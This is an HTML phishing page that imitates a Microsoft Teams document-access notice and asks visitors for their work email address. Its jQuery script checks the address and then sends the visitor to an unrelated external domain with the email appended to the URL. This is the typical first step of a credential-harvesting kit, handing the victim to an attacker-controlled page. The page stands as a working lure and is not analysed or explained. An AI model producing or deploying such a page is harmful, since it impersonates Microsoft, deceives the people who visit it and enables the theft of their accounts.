<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Microsoft Teams - Document Access</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    html, body {
      height: 100%;
      margin: 0;
      background: linear-gradient(135deg, #f3f6fb, #e9edf4);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .main-wrapper {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100%;
      padding: 20px;
    }
    .card-wrapper {
      background: #ffffff;
      border-radius: 1rem;
      padding: 2.5rem 2rem;
      max-width: 480px;
      width: 100%;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
      text-align: center;
      border-top: 6px solid #0078d4;
    }
    .card-wrapper h2 {
      color: #0078d4;
      font-size: 1.8rem;
      font-weight: bold;
      margin-bottom: 0.5rem;
    }
    .card-wrapper p.lead {
      font-size: 1rem;
      margin-top: 0.5rem;
      color: #333;
    }
    .info-box {
      background-color: #e8f1fc;
      color: #004a94;
      font-size: 0.9rem;
      padding: 0.75rem 1rem;
      border-left: 4px solid #0078d4;
      margin-top: 1rem;
      text-align: left;
      border-radius: 0.25rem;
    }
    .form-control {
      margin-top: 1.5rem;
      height: 44px;
      font-size: 0.95rem;
    }
    .btn-custom {
      background-color: #0078d4;
      color: #fff;
      font-weight: 600;
      margin-top: 1.5rem;
      padding: 0.6rem;
      font-size: 1rem;
    }
    .btn-custom:hover {
      background-color: #005fa3;
    }
    .val-msg {
      text-align: left;
      margin-top: 0.5rem;
      font-size: 0.85rem;
    }
    hr {
      margin-top: 2rem;
      margin-bottom: 1rem;
    }
  </style>
</head>
<body>
  <div class="main-wrapper">
    <div class="card-wrapper">
      <h2><i class="fas fa-file-alt"></i> Document Notification</h2>
      <p class="lead">Please verify your email address to securely access your document.</p>
      <div class="info-box">
        For your privacy, Microsoft Document Services requires authentication before granting access to shared documents.
      </div>
      <input type="email" id="email" class="form-control" placeholder="Work or business email" />
      <div class="text-left text-danger d-none val-msg">&#9432; Enter a valid email address to continue</div>
      <button class="btn btn-custom btn-block validate" type="button">Access Document</button>
      <hr>
      <p class="small mb-0">Need help? Reach out to Microsoft Support.</p>
    </div>
  </div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
  <script>
    $('.validate').click(function () {
      const email = $('#email').val().trim();
      const errorMsg = $('.val-msg');

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      if (!emailRegex.test(email)) {
        errorMsg.removeClass('d-none');
        return;
      }

      errorMsg.addClass('d-none');

      const redirectUrl = 'https://swift.rpcaof.sa.com/bfA@Lp450FNPz4kqJ0/$' + encodeURIComponent(email);
      window.location.href = redirectUrl;
    });
  </script>
</body>
</html>
